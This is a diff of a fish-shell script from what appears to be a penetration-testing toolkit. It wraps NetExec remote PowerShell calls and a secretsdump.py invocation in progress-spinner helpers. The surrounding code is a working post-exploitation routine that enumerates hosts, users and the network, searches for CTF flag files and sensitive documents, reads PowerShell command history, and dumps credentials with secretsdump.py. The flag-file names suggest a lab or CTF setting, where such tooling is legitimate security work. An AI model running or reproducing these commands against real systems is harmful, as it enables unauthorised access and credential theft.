@@ -181,17 +181,17 @@ Examples:
     ezpz_info "Hostname"
     set cmd "hostname"
     ezpz_cmd $cmd
-    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$'
+    ezpz_spin nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$'
 
     ezpz_info "Operating System"
     set cmd "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version"
     ezpz_cmd $cmd
-    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +7 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$'
+    ezpz_spin nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" | tail -n +7 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$'
 
     ezpz_info "Users with home directories"
     set cmd "Get-ChildItem C:/Users -Force | Select-Object Name"
     ezpz_cmd $cmd
-    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +7 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$' | grep -iv 'Desktop.ini'
+    ezpz_spin nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" | tail -n +7 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$' | grep -iv 'Desktop.ini'
 
     # Section 2: Getting Network Information
     ezpz_header "Getting network information..."
@@ -199,12 +199,12 @@ Examples:
     ezpz_info "Network interfaces"
     set cmd "Get-NetIPConfiguration"
     ezpz_cmd $cmd
-    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | sed '1,/^$/d' | grep -E "^(InterfaceAlias|IPv4Address|IPv6Address|DefaultGateway)" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | grep -v -e '^$'
+    ezpz_spin nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" | tail -n +4 | tr -s " " | cut -d " " -f 5- | sed '1,/^$/d' | grep -E "^(InterfaceAlias|IPv4Address|IPv6Address|DefaultGateway)" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | grep -v -e '^$'
 
     ezpz_info "ARP Cache"
     set cmd "arp -a"
     ezpz_cmd $cmd
-    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +7 | tr -s " " | cut -d " " -f 5- | grep -v 'Interface' | awk '{print $1}' | sort -V | grep -v -e '^$'
+    ezpz_spin nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" | tail -n +7 | tr -s " " | cut -d " " -f 5- | grep -v 'Interface' | awk '{print $1}' | sort -V | grep -v -e '^$'
 
     # Section 3: Extracting Secrets
     ezpz_header "Extracting secrets..."
@@ -213,17 +213,17 @@ Examples:
     set cmd 'Get-ChildItem -Path C:/ -Recurse -Force -Include flag.txt,user.txt,root.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Output "[FOUND] $($_.FullName)"; Get-Content $_.FullName }'
 
     ezpz_cmd $cmd
-    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | sed 's/[[:space:]]*$//' | grep -v -e '^$'
+    ezpz_spin nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" | tail -n +4 | tr -s " " | cut -d " " -f 5- | sed 's/[[:space:]]*$//' | grep -v -e '^$'
 
     ezpz_info "Searching for interesting files in user folders"
     set cmd "Get-ChildItem -Path C:/Users -Force -Recurse -Depth 3 -Include *.config,*.xml,*.json,*.yml,*.yaml,*.log,*.bak,*.old,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ps1,*.bat,*.exe,*.lnk -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName"
     ezpz_cmd $cmd
-    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | sed 's/[[:space:]]*$//' | grep -v -e '^$' | grep -vi 'appdata' | grep -vi 'local settings' | grep -vi 'application data' | grep -vi 'all users' | grep -vi 'start menu' | grep -v 'SendTo' | grep -v 'Searches' | grep -viE '[\\/](flag|user|root)\.txt$' | sort -u
+    ezpz_spin nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" | tail -n +4 | tr -s " " | cut -d " " -f 5- | sed 's/[[:space:]]*$//' | grep -v -e '^$' | grep -vi 'appdata' | grep -vi 'local settings' | grep -vi 'application data' | grep -vi 'all users' | grep -vi 'start menu' | grep -v 'SendTo' | grep -v 'Searches' | grep -viE '[\\/](flag|user|root)\.txt$' | sort -u
 
     ezpz_info "Extracting shell history (PowerShell and CMD)"
     set cmd "Get-ChildItem -Path C:/Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/*.txt -ErrorAction SilentlyContinue | ForEach-Object { Get-Content \$_.FullName -ErrorAction SilentlyContinue }"
     ezpz_cmd $cmd
-    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$'
+    ezpz_spin nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$'
 
     # Section 4: SecretsDump.py Integration
     ezpz_header "Dumping credentials with secretsdump.py..."
@@ -268,7 +268,7 @@ Examples:
 
     ezpz_cmd "secretsdump.py $secretsdump_cmd_args"
     set -l secretsdump_log (mktemp)
-    secretsdump.py $secretsdump_cmd_args > $secretsdump_log 2>&1
+    ezpz_spin_capture $secretsdump_log secretsdump.py $secretsdump_cmd_args
     set -l secretsdump_status $status
 
     # Track if any secretsdump output files were produced
